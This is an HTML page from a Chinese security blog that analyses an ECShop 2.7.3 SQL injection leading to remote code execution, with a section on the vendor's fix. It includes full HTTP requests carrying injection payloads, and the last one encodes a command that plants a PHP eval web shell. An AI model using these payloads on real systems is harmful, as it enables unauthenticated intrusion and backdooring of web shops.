@@ -1,0 +1,1082 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="php,rce,sqli,漏洞复现," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="ECshop 漏洞分析0x01 前言这两天出来一个ECshop的全版本RCE漏洞。先感慨一下，自己怎么这么菜，当时审计的时候没发现。最近事情又多，又开始懒了，所以这里补一下这个坑。 漏洞环境 ECshop_v2.7.3 nginx php  0x02 分析漏洞的触发点在于ECShop系统的 user.php 文件中， display 函数的参数可控，可以配合注入可达到远程代码执行的效果。 由于是可">
+<meta name="keywords" content="php,rce,sqli,漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ECShop sqli and rce">
+<meta property="og:url" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/index.html">
+<meta property="og:site_name" content="l1nk3r&#39;s blog">
+<meta property="og:description" content="ECshop 漏洞分析0x01 前言这两天出来一个ECshop的全版本RCE漏洞。先感慨一下，自己怎么这么菜，当时审计的时候没发现。最近事情又多，又开始懒了，所以这里补一下这个坑。 漏洞环境 ECshop_v2.7.3 nginx php  0x02 分析漏洞的触发点在于ECShop系统的 user.php 文件中， display 函数的参数可控，可以配合注入可达到远程代码执行的效果。 由于是可">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/1.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/2.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/3.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/4.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/5.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/6.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/7.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/3.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/8.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/9.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/10.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/11.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/12.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/11.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/14.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/13.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/8.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/15.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/16.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/17.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/18.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/19.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/20.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/21.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/22.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/23.png">
+<meta property="og:updated_time" content="2018-09-02T10:17:53.427Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ECShop sqli and rce">
+<meta name="twitter:description" content="ECshop 漏洞分析0x01 前言这两天出来一个ECshop的全版本RCE漏洞。先感慨一下，自己怎么这么菜，当时审计的时候没发现。最近事情又多，又开始懒了，所以这里补一下这个坑。 漏洞环境 ECshop_v2.7.3 nginx php  0x02 分析漏洞的触发点在于ECShop系统的 user.php 文件中， display 函数的参数可控，可以配合注入可达到远程代码执行的效果。 由于是可">
+<meta name="twitter:image" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/"/>
+
+
+
+
+
+  <title>ECShop sqli and rce | l1nk3r's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">l1nk3r's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friends">
+          <a href="/Friends" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            Friends
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="l1nk3r">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1nk3r's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ECShop sqli and rce</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-02T18:14:24+08:00">
+                2018-09-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+            
+              &nbsp; | &nbsp;
+              <span id="/2018/09/02/ECShop-sqli-and-rce/"class="leancloud_visitors" data-flag-title="ECShop sqli and rce">
+              &nbsp;热度
+              </span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/09/02/ECShop-sqli-and-rce/" class="leancloud_visitors" data-flag-title="ECShop sqli and rce">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="ECshop-漏洞分析"><a href="#ECshop-漏洞分析" class="headerlink" title="ECshop 漏洞分析"></a>ECshop 漏洞分析</h2><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>这两天出来一个ECshop的全版本RCE漏洞。先感慨一下，自己怎么这么菜，当时审计的时候没发现。最近事情又多，又开始懒了，所以这里补一下这个坑。</p>
+<h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><ul>
+<li>ECshop_v2.7.3</li>
+<li>nginx</li>
+<li>php</li>
+</ul>
+<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>漏洞的触发点在于ECShop系统的 <strong>user.php</strong> 文件中， <strong>display</strong> 函数的参数可控，可以配合注入可达到远程代码执行的效果。</p>
+<p>由于是可以不登陆的前台RCE，所以这个漏洞危害还是很高的感觉，利用成本感觉也相当的低。所以分析的时候分两部分，第一部分是SQL注入分析，第二部分是RCE分析。</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>首先漏洞的触发点在 <strong>user.php</strong> 文件中的 <strong>Referer</strong> 字段里，我们截取部分相关代码看一下。 <strong>第8行</strong> 中的 <strong>$back_act</strong> 变量从 <strong>server</strong> 数组中的 <strong>Referer</strong> 字段获取数据，众所周知， <strong>Referer</strong> 字段是可控的。然后代码中的 <strong>第20行</strong> 以 <strong>assign</strong> 方法处理 <strong>$back_act</strong> 变量的值。<strong>第21行</strong> 以 <strong>display</strong> 方法处理 <strong>user_passport.dwr</strong> 。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/1.png" alt="1"></p>
+<p>跟进一下 <strong>assign</strong> 方法，这个函数位置在 <strong>/includes/cls_template.php</strong> 文件中，我们截取部分相关代码，从代码中来看 <strong>assign</strong> 方法的作用是把可控变量传递给模版函数。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/2.png" alt="2"></p>
+<p>我们继续跟进一下 <strong>display</strong> 方法，该方法出现在 <strong>/includes/cls_template.php</strong> 文件中，截取部分相关代码。这里的 <strong>display</strong> 方法的作用应该是将模版内容展现在页面上。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/3.png" alt="3"></p>
+<p>而我们刚刚 <strong>user.php</strong> 中的代码是这样的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</span><br></pre></td></tr></table></figure>
+<p>所以这里 <strong>display</strong> 方法的使用就是读取 <strong>user_passport.dwt</strong> 文件的内容，然后解析变量展示为 <strong>html</strong> ，并且在 <strong>第18行</strong> 中交由 <strong>_echash</strong> 进行分割处理，得到的 <strong>$k</strong> 变量的值交由 <strong>insert_mod</strong> 方法进行处理。这里实际上 <strong>insert_mod</strong> 方法中的 <strong>$val</strong> 是可控的。我们跟进一下 <strong>insert_mod</strong> 方法。</p>
+<p>该方法出现在 <strong>/includes/cls_template.php</strong> 文件中，截取部分相关代码。这个 <strong>insert_mod</strong> 方法在 <strong>第三行</strong> 以<code>|</code>字符分割传入的内容， <strong>第四行</strong> 反序列化传输入的 <strong>$para</strong> ，然后 <strong>第五行</strong> 通过字符串拼接的方式动态调用函数，最后在 <strong>第7行</strong> 返回调用函数处理 <strong>$para</strong> 变量的结果。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/4.png" alt="4"></p>
+<p>所以这里 <strong>insert_mod</strong> 方法里的函数与参数均可以被控制，我们知道注入点在 <strong>/includes/lib_insert.php</strong> 中的 <strong>insert_ads</strong> 方法，我们看一下相关代码。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/5.png" alt="5"></p>
+<p>这里很明显 <strong>第21行</strong> 和 <strong>第22行</strong> 的 <strong>$arr[‘id’]</strong> 和 <strong>\$arr[‘num’]</strong> 存在SQL注入。我们来验证一下漏洞。我们看一下正常的登陆过程中的序列化字符串</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/6.png" alt="6"></p>
+<p>然后我们看看我们的sql注入的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /ECShop_V2.7.3/upload/user.php HTTP/1.1</span><br><span class="line">Host: 192.168.248.134</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: PHPSESSID=smvoo8f5vtgjdtjiva5t0sbec3; ECS_ID=8eea8943e36b6f122bee4ae508742f4e99f354f2; ECS[visit_times]=1</span><br><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;&#125;</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/7.png" alt="7"></p>
+<h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><p>漏洞触发流程还是通过 <strong>user.php</strong> 文件中的 <strong>Referer</strong> 字段传递参数，然后通过 <strong>display</strong> 方法处理 <strong>user_passport.dwr</strong> 。跟进 <strong>display</strong> 方法，该方法在 <strong>/includes/cls_template.php</strong> 文件中，这次的触发点是在第16行的 <strong>fetch</strong> 方法。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/3.png" alt="3"></p>
+<p>跟进 <strong>fetch</strong> 方法，相关代码 <strong>/includes/cls_template.php</strong> 文件。这里 <strong>第20行</strong> 的 <strong>_eval</strong> 函数引起了我的主意。跟进一下 <strong>_eval</strong> 函数。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/8.png" alt="8"> <strong>_eval</strong> 函数出现在 <strong>/includes/cls_template.php</strong> 文件，我们看看相关代码， <strong>eval</strong> 函数里的可控，那么就会造成RCE的问题了。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/9.png" alt="9"></p>
+<p>所以这里需要找一下哪里调用了这个 <strong>fetch</strong> 方法，回过头来，我们想想，我们的SQL注入通过动态函数调用，找到存在注入点 <strong>insert_ads</strong> 的函数。那么我们在找找这个函数，我们发现这个方法也存在 <strong>fetch</strong> 方法的调用，相关代码出现在 <strong>/includes/lib_insert.php</strong> 文件中。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/10.png" alt="10"></p>
+<p>我们看到 <strong>第7行</strong> 有这样一样代码，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$val = $GLOBALS[<span class="string">'smarty'</span>]-&gt;fetch($position_style);</span><br></pre></td></tr></table></figure>
+<p>跟进一下 <strong>$position_style</strong> ，该变量的取值过程也在 <strong>/includes/lib_insert.php</strong> 文件中写好了。该 <strong>$position_style</strong> 变量是从数据库中获取数据，假设这个字段可控，那么就会有RCE问题产生了。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/11.png" alt="11"></p>
+<p>这里我们就需要配合刚刚说的SQL注入漏洞。我们知道注入点有两处，一个是 <strong>$arr[‘id’]</strong> ，另一个是 <strong>$[‘num’]</strong> 。 <strong>$arr[‘id’]</strong> 的位置在 <strong>and</strong> 后，可以构造 <strong>union</strong> 联合查询。而 <strong>$[‘num’]</strong> 位置在 <strong>order by</strong> 后面，所以这里可能没办法使用，我们可以截断它。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/12.png" alt="12"></p>
+<p>这里针对 <strong>$row[‘position_id’]</strong> 做了判断，所以首先我们需要绕过这里判断。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/11.png" alt="11"></p>
+<p>这里我们可以在id处传入<code>&#39;/*</code>这里的作用就是闭合前面的单引号，然后配合num的值注释掉<code>ORDER BY rnd LIMIT</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /ECShop_V2.7.3/upload/user.php HTTP/1.1</span><br><span class="line">Host: 172.16.244.129</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: PHPSESSID=smvoo8f5vtgjdtjiva5t0sbec3; ECS_ID=8eea8943e36b6f122bee4ae508742f4e99f354f2; ECS[visit_times]=1</span><br><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:47:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,9,10-- -&quot;;s:2:&quot;id&quot;;s:3:&quot;&apos;/*&quot;;&#125;</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/14.png" alt="14"></p>
+<p>在数据库里运行之后</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/13.png" alt="13"></p>
+<p>这里我们前面分析过，我们可控的字段是 <strong>$row[position_style]</strong> ，因此这里需要将payload的位置填写在 <strong>$row[position_style]</strong> 。</p>
+<p>这里我们在回过头来看看 <strong>fetch</strong> 方法，相关代码 <strong>/includes/cls_template.php</strong> 文件。主要是查看是否有做一些过滤。我们看到 <strong>第20行</strong> 调用 <strong>fetch_str</strong> 函数处理传入的数据，跟进 <strong>fetch_str</strong> 函数。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/8.png" alt="8"></p>
+<p>该函数出现在 <strong>/includes/cls_template.php</strong> 文件中，截取相关代码，关键代码在 <strong>第13行</strong> 。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/15.png" alt="15"></p>
+<p>这个函数处理之后最终会return回一个数据，而这部代码主要的作用是假如<code>$source=xxxx{$asd}xxx</code>,那么经过这行代码处理后就是返回<code>this-&gt;select(&#39;\$asd&#39;)</code>的值。</p>
+<p>这里继续跟进一下 <strong>select</strong> 函数，该函数位置也在 <strong>/includes/cls_template.php</strong> 文件中。我们看到 <strong>第21行</strong> ，出现<code>$</code>的时候，会调用 <strong>get_val</strong> 函数进行处理。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/16.png" alt="16"></p>
+<p>跟进 <strong>get_val</strong> 函数，该函数位置也在 <strong>/includes/cls_template.php</strong> 文件中。代码 <strong>第14行</strong> 当我们的 <strong>\$val</strong> 参数没有<code>.$</code>会在 <strong>第26行</strong> 调用 <strong>make_var</strong> 函数进行处理。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/17.png" alt="17"></p>
+<p>跟进一下 <strong>make_var</strong> 函数，该函数位置也在 <strong>/includes/cls_template.php</strong> 文件中。这里我们的 <strong>$val</strong> 变量最后处理的结果实际上是个字符串。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/18.png" alt="18"></p>
+<p>所以这里我们下个断点看看。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /ECShop_V2.7.3/upload/user.php HTTP/1.1</span><br><span class="line">Host: 172.16.244.129</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: PHPSESSID=smvoo8f5vtgjdtjiva5t0sbec3; ECS_ID=8eea8943e36b6f122bee4ae508742f4e99f354f2; ECS[visit_times]=1</span><br><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:70:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x617b246c316e6b33727d61,10-- -&quot;;s:2:&quot;id&quot;;s:3:&quot;&apos;/*&quot;;&#125;</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/19.png" alt="19"></p>
+<p>这里的<code>0x617b246c316e6b33727d61</code>对应的值是<code>a{$l1nk3r}a</code></p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/20.png" alt="20"></p>
+<p>因此这里实际上，我们需要闭合这个单引号和反括号，逃逸出来然后执行我们想执行的东西。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$l1nk3r<span class="string">'];assert(base64_decode('</span>ZmlsZV9wdXRfY29udGVudHMoJ2wxbmszci5waHAnLCc8P3BocCBldmFsKCRfUE9TVFtsMW5rM3JdKTsgPz4nKQ==<span class="string">'));//&#125;xxx</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /ECShop_V2.7.3/upload/user.php HTTP/1.1</span><br><span class="line">Host: 172.16.244.129</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: PHPSESSID=smvoo8f5vtgjdtjiva5t0sbec3; ECS_ID=8eea8943e36b6f122bee4ae508742f4e99f354f2; ECS[visit_times]=1</span><br><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:310:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b246c316e6b3372275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a327778626d737a636935776148416e4c4363385033426f6343426c646d46734b43526655453954564674734d5735724d334a644b547367507a346e4b513d3d2729293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:3:&quot;&apos;/*&quot;;&#125;</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p>最后会在根目录下生成一个马。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/21.png" alt="21"></p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/22.png" alt="22"></p>
+<h2 id="0x03-修复方式"><a href="#0x03-修复方式" class="headerlink" title="0x03 修复方式"></a>0x03 修复方式</h2><p>我们可以看到最新版在 <strong>$arr[‘num’]</strong> 和 <strong>\$arr[‘id’]</strong> 中加入了intval，强制类型转换来修复。</p>
+<p><img src="/2018/09/02/ECShop-sqli-and-rce/23.png" alt="23"></p>
+<h2 id="0x04-思考"><a href="#0x04-思考" class="headerlink" title="0x04 思考"></a>0x04 思考</h2><p>PHP下这种模板引起的RCE好像不少见了，seacms的那个好像也是因为这个引起的，但是吧，这个问题为啥自己没审计到呢，归根到底还是太菜了。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
+          
+            <a href="/tags/rce/" rel="tag"><i class="fa fa-tag"></i> rce</a>
+          
+            <a href="/tags/sqli/" rel="tag"><i class="fa fa-tag"></i> sqli</a>
+          
+            <a href="/tags/漏洞复现/" rel="tag"><i class="fa fa-tag"></i> 漏洞复现</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/12/一个有趣的preg-replace函数/" rel="next" title="一个有趣的preg_replace函数">
+                <i class="fa fa-chevron-left"></i> 一个有趣的preg_replace函数
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
